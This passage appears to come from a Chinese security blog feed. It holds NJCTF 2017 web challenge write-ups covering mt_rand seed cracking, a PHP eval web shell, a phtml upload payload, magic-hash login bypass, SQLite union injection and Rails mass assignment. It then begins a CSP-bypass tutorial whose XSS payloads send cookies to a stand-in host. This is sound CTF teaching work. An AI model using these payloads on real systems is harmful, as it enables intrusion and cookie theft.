class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,<span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $ss = mt_rand();</span><br><span class="line">    $hash = md5(session_id() . $ss);</span><br><span class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $check1 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">    $check2=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($check2) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($check1) &#123;</span><br><span class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">            show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到上传的文件在原文件名前加上了32位的随机字符串，刚开始想的是上传后爆破这个随机串，但是有 61^32 种可能性，一天也跑不完，后来知道是爆破随机数种子，因为 mt_rand 对于同一个种子来说，产生的随机数序列是固定的，而产生的32位随机串就是用的 mt_rand 来产生的，但是直接请求页面的话太慢了，注意到这几行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$ss = mt_rand();</span><br><span class="line">$hash = md5(session_id() . $ss);</span><br><span class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br></pre></td></tr></table></figure></p><p><code>session_id()</code> 是用来获取 会话ID 的，如果把 PHPSESSID 设置为空的话，我们就可以得到 \$ss(即产生的第一个随机数) 的 md5 值，拿到 md5 查询网站上可以得到 \$ss 的值，那么就可以爆破种子，满足第一个随机数与我们的相同的即为我们想要获得的种子。因为 php 爆破还是太慢，我这里用了一个叫 php_mt_seed 的 c语言 写的工具，不到一分钟就可以跑出种子。然后就可以得到文件名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mt_srand(<span class="string">'10818363'</span>);</span><br><span class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">"\n"</span>;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,<span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,<span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,<span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> random_str();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后利用之前出题时 zip伪协议 包含的思路上传包含 shell 文件的 zip 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=zip://uP1O4Ds/vN3LOt2mcnaAJtBXXraTwrESO3VbjkAt_233.png%23shell</span><br></pre></td></tr></table></figure></p><p>shell.php 文件内容为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">'HeartSky'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>连上蚁剑就可以 getshell 了<br><img src="http://heartsky.info/images/image/NJCTF_2017_1.png" alt="http://heartsky.info/images/image/NJCTF_2017_1.png"></p><h3 id="pictures’-wall-400"><a href="#pictures’-wall-400" class="headerlink" title="pictures’ wall - 400"></a>pictures’ wall - 400</h3><blockquote><p>图片墙上有图片<br><a href="http://218.2.197.235:23719/" target="_blank" rel="external">http://218.2.197.235:23719/</a></p></blockquote><p>有一个登录功能，可以实现任意登录(数据没有经过数据库)，登陆上去以后有一个文件上传功能，只有 Root 才能上传文件，但无论以什么用户名登录都会提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Root&apos;s pictureWall</span><br><span class="line">Root has privileges to upload files</span><br></pre></td></tr></table></figure></p><p>发现把 host 改为 127.0.0.1，就能正常使用文件上传功能<br>有检测文件后缀和 MIME 类型，还会检测上传文件的内容</p><p>学到了一种后缀，phtml，在嵌入了 php 脚本的 html 中，使用  phtml 作为后缀名，所以 payload 如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryxCi7MJ9QQAEy6w24</span><br><span class="line">Content-Disposition: form-data; name=&quot;pic&quot;; filename=&quot;test.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;$_GET[&apos;a&apos;]($_GET[&apos;b&apos;])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>然后就 getshell 了，不得不吐槽下看了源码后发现解法都写死了，强行造洞好难受 = =</p><h3 id="Wallet-300"><a href="#Wallet-300" class="headerlink" title="Wallet - 300"></a>Wallet - 300</h3><p>扫目录得到 www.zip 源码包，admin.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"db.php"</span>;</span><br><span class="line">$auth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"auth"</span>])) &#123;</span><br><span class="line">    $auth = $_COOKIE[<span class="string">"auth"</span>];</span><br><span class="line">    $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($auth == $hsh) &#123;</span><br><span class="line">        $auth = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sha1((string) $hsh) == md5((string) $auth)) &#123;</span><br><span class="line">            $auth = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $auth = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $auth = <span class="number">0</span>;</span><br><span class="line">    $s = $auth;</span><br><span class="line">    setcookie(<span class="string">"auth"</span>, $s);</span><br><span class="line">    setcookie(<span class="string">"hsh"</span>, sha1((string) $s));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'query'</span>])) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);</span><br><span class="line">        $qstr = SQLITE3::escapeString($_GET[<span class="string">'query'</span>]);</span><br><span class="line">        $query = <span class="string">"SELECT amount FROM my_wallets WHERE id=&#123;$qstr&#125;"</span>;</span><br><span class="line">        $result = $db-&gt;querySingle($query);</span><br><span class="line">        <span class="keyword">if</span> (!$result === <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error - invalid query"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wallet contains: &#123;$result&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, not authorized."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先要 $auth 为 1，满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1((string) $hsh) == md5((string) $auth</span><br></pre></td></tr></table></figure></p><p>这个才可以，因为是 <code>==</code> ，所以我们可以利用 0e564 == 0 的性质来使得条件成立，详情参考 <a href="https://www.whitehatsec.com/blog/magic-hashes/" target="_blank" rel="external">https://www.whitehatsec.com/blog/magic-hashes/</a></p><p>然后下面就是一个 SQLITE 的注入了<br><a href="http://www.zhutougg.com/2017/02/27/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/" target="_blank" rel="external">http://www.zhutougg.com/2017/02/27/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union select 1</span><br></pre></td></tr></table></figure></p><p>可以输出我们想要的值，要先获得表名，SQLITE 没有像 MySQL 中那样包含所有数据库、表、列的 information_schema 库。事实上，对于它而言，没有库的概念，直接对象是表，但是它是有系统表的，即 <code>sqlite_master</code>，表中有这些字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type 类型</span><br><span class="line">name 索引</span><br><span class="line">tbl_name 表名</span><br><span class="line">sql 创建该表的 SQL 语句</span><br></pre></td></tr></table></figure></p><p>因此我们可以从这个表中得到所有表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(tbl_name) <span class="keyword">from</span> sqlite_master</span><br><span class="line"><span class="keyword">Wallet</span> contains: flag,flag,my_wallets,my_wallets</span><br></pre></td></tr></table></figure></p><p>猜测 flag 是在 flag 表中，查询 sql 来得到列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">sql</span>) <span class="keyword">from</span> sqlite_master</span><br><span class="line"><span class="keyword">Wallet</span> contains: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> flag (<span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="literal">null</span>, amount <span class="built_in">int</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="number">0</span>, primary <span class="keyword">key</span>(<span class="keyword">id</span>)),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> my_wallets (<span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">40</span>) <span class="keyword">not</span> <span class="literal">null</span>, amount <span class="built_in">int</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="number">0</span>, primary <span class="keyword">key</span>(<span class="keyword">id</span>))</span><br></pre></td></tr></table></figure></p><p>最后 flag 是在 flag 表中的 id 列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>) <span class="keyword">from</span> flag</span><br><span class="line"><span class="keyword">Wallet</span> contains: NJCTF&#123;Th3_m1xtu2e_0F_M4gic_Ha5h_@nd_5Qlite_InJec7ion&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Blog-150"><a href="#Blog-150" class="headerlink" title="Blog - 150"></a>Blog - 150</h3><blockquote><p>前端养成之路，从写博客开始<br><a href="http://218.2.197.235:23727" target="_blank" rel="external">http://218.2.197.235:23727</a></p></blockquote><p>打开后是一个 Ruby 写的站，提供了源码，因为用 laravel 写过站，很容易看出是用框架写的站，直接看控制器里注册那一部分<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">user_params</span></span></span><br><span class="line">    params.<span class="keyword">require</span>(<span class="symbol">:user</span>).permit(<span class="symbol">:name</span>, <span class="symbol">:email</span>, <span class="symbol">:password</span>, <span class="symbol">:password_confirmation</span>, <span class="symbol">:admin</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>可以看到注册时有 admin 这个参数，但是注册时抓包看一下却没有，然后再去看下创建数据库的语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create_table "users", force: true <span class="keyword">do</span> |t|</span><br><span class="line">  t.string   <span class="string">"name"</span></span><br><span class="line">  t.string   <span class="string">"email"</span></span><br><span class="line">  t.datetime <span class="string">"created_at"</span></span><br><span class="line">  t.datetime <span class="string">"updated_at"</span></span><br><span class="line">  t.string   <span class="string">"password_digest"</span></span><br><span class="line">  t.string   <span class="string">"remember_token"</span></span><br><span class="line">  t.boolean  <span class="string">"admin"</span>,           <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>admin 参数默认为0，也就是说如果 admin 为1的话，就是管理员了<br>注册时加上 <code>user[admin]=1</code>，因为用户列表中有提示 <code>&lt;!--flag is here--&gt;</code>，所以 flag 就在这里</p><p>先写这些，其他的待会再来补</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;NJCTF - XCTF联赛南京站&lt;br&gt;这次比赛 web 题好多啊 - -&lt;/p&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Login-100&quot;&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>那些年我们绕过的CSP</title>
    <link href="http://heartsky.info/2017/03/03/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87%E7%9A%84CSP/"/>
    <id>http://heartsky.info/2017/03/03/那些年我们绕过的CSP/</id>
    <published>2017-03-03T14:04:06.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近各大比赛中 CSP 绕过的题目突然多了起来，自己也尝试着总结下</p><h3 id="What-is-CSP"><a href="#What-is-CSP" class="headerlink" title="What is CSP?"></a>What is CSP?</h3><blockquote><p>The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to load via a HTTP Header.</p></blockquote><p>CSP(Content Security Policy) 在 HTTP 响应头中规定，用来减少 XSS 攻击。在 HTTP 响应中长这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; cdn.example.com;</span><br></pre></td></tr></table></figure></p><h3 id="Directive-Reference-指令参考"><a href="#Directive-Reference-指令参考" class="headerlink" title="Directive Reference(指令参考)"></a>Directive Reference(指令参考)</h3><ul><li>不同指令之间用 <code>;</code> 分隔</li><li>同一指令的多个指令值之间用空格分隔</li><li>指令值除了 URL 都要用引号包裹</li><li>指令如果重复，则以第一个为准</li></ul><table><thead><tr><th>指令</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>‘self’ cdn.example.com</td><td>定义资源默认加载策略</td></tr><tr><td>script-src</td><td>‘self’ js.example.com</td><td>定义 JS 的加载策略</td></tr><tr><td>img-src</td><td>‘self’ img.example.com</td><td>定义图片的加载策略</td></tr><tr><td>style-src</td><td>‘self’ css.example.com</td><td>定义样式表的加载策略</td></tr><tr><td>font-src</td><td>font.example.com</td><td>定义字体的加载策略、</td></tr><tr><td>object-src</td><td>‘self’</td><td>定义引用资源的加载策略，如 &lt;object&gt; &lt;embed&gt; &lt;applet&gt;等</td></tr><tr><td>media-src</td><td>media.example.com</td><td>定义音频和视频的加载策略，如 HTML5 中的 &lt;audio&gt; &lt;video&gt;</td></tr><tr><td>connect-src</td><td>‘self’</td><td>定义 Ajax、WebSocket 等的加载策略</td></tr><tr><td>frame-src</td><td>‘self’</td><td>定义 frame 的加载策略，不赞成使用，改用 child-src</td></tr></tbody></table><h3 id="Source-List-Reference"><a href="#Source-List-Reference" class="headerlink" title="Source List Reference"></a>Source List Reference</h3><p>所有以 -src 结尾的指令的指令值语法是相似的，我们称它为 source list</p><table><thead><tr><th>源值</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>img-src *</td><td>通配符，允许除 <font color="green">data: blob: filesystem:</font> 协议之外的任意 URL</td></tr><tr><td>‘none’</td><td>object-src ‘none’</td><td>不允许加载任何资源</td></tr><tr><td>‘self’</td><td>script-src ‘self’</td><td>允许加载同域(即同域名、同协议、同端口)下的资源</td></tr><tr><td>data:</td><td>img-src ‘self’ data:</td><td>允许通过 data 协议加载资源，如 <font color="green">data:image/jpeg;base64,base64_encode_data</font></td></tr><tr><td>domain.example.com</td><td>img-src domain.example.com</td><td>允许加载指定域名下的资源</td></tr><tr><td>*.example.com</td><td>img-src *.example.com</td><td>允许加载 example.com 下所有子域名的资源</td></tr><tr><td>‘unsafe-inline’</td><td>script-src ‘unsafe-inline’</td><td>允许执行内联资源，如样式属性、事件、script 标签</td></tr><tr><td>‘unsafe-eval’</td><td>script-src ‘unsafe-eval’</td><td>允许不安全的动态代码执行，如 JS 中的 eval() 函数</td></tr><tr><td><a href="https://cdn.com" target="_blank" rel="external">https://cdn.com</a></td><td>img-src <a href="https://cdn.com" target="_blank" rel="external">https://cdn.com</a></td><td>只允许给定域名下的通过 HTTPS 连接的资源</td></tr><tr><td>https:</td><td>img-src https:</td><td>只允许通过 HTTPS 连接的资源</td></tr></tbody></table><h3 id="Some-examples"><a href="#Some-examples" class="headerlink" title="Some examples"></a>Some examples</h3><h5 id="只允许加载同源下的任何资源"><a href="#只允许加载同源下的任何资源" class="headerlink" title="只允许加载同源下的任何资源"></a><strong>只允许加载同源下的任何资源</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;;</span><br></pre></td></tr></table></figure><h5 id="允许加载谷歌分析的-JS-用来统计数据，如博客访问量-和同源下的资源"><a href="#允许加载谷歌分析的-JS-用来统计数据，如博客访问量-和同源下的资源" class="headerlink" title="允许加载谷歌分析的 JS(用来统计数据，如博客访问量)和同源下的资源"></a><strong>允许加载谷歌分析的 JS(用来统计数据，如博客访问量)和同源下的资源</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src: &apos;self&apos; www.google-analytics.com</span><br></pre></td></tr></table></figure><h5 id="只允许加载同域下的图片、JS、CSS-和-Ajax-请求，其他类型的资源不允许加载"><a href="#只允许加载同域下的图片、JS、CSS-和-Ajax-请求，其他类型的资源不允许加载" class="headerlink" title="只允许加载同域下的图片、JS、CSS 和 Ajax 请求，其他类型的资源不允许加载"></a><strong>只允许加载同域下的图片、JS、CSS 和 Ajax 请求，其他类型的资源不允许加载</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;</span><br></pre></td></tr></table></figure><h3 id="Bypass-unsafe-CSP"><a href="#Bypass-unsafe-CSP" class="headerlink" title="Bypass unsafe CSP"></a>Bypass unsafe CSP</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &apos;self&apos; &apos;unsafe-inline&apos;；</span><br></pre></td></tr></table></figure><p>当开启了这个选项时，意味着可以执行内联资源，包括 JS、样式表等<br>假设我们这里的例子都有一个向管理员留言的功能，而目标都是让管理员访问我们的目标网站，从而获取一些信息，乃至很重要的 Cookie。<br>在没有过滤的条件下我们可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=http://xxx.com+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=http://xxx.com+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var i = document.createElement(&apos;img&apos;);</span><br><span class="line">i.src = &apos;http://xxx.com&apos; + document.cookie;</span><br><span class="line">document.body.appendChild(i);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>至于有过滤的情况下，为了不至于那么生硬，我们举几个真实比赛中的例子</p><h5 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点"></a><strong>过滤了点</strong></h5><p>Google CTF 2016 Wallowing Wallabies - Part Three<br>过滤了所有的点，属性的点可以用 <code>[&#39;&#39;]</code> 的形式来代替，URL 我们可以用 String.fromCharCode 函数，所以最后的 payload 是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var i = document[&apos;createElement&apos;](&apos;img&apos;);</span><br><span class="line">i[&apos;src&apos;] = String[&apos;fromCharCode&apos;](http://xxx.com 所对应的 Ascii 码，用逗号分隔) + document[&apos;cookie&apos;];</span><br><span class="line">document[&apos;body&apos;][&apos;appendChild&apos;](i);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="过滤了大部分关键字"><a href="#过滤了大部分关键字" class="headerlink" title="过滤了大部分关键字"></a><strong>过滤了大部分关键字</strong></h5><p>在最近结束的 ZCTF 2017 中就碰到了这样一道题，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 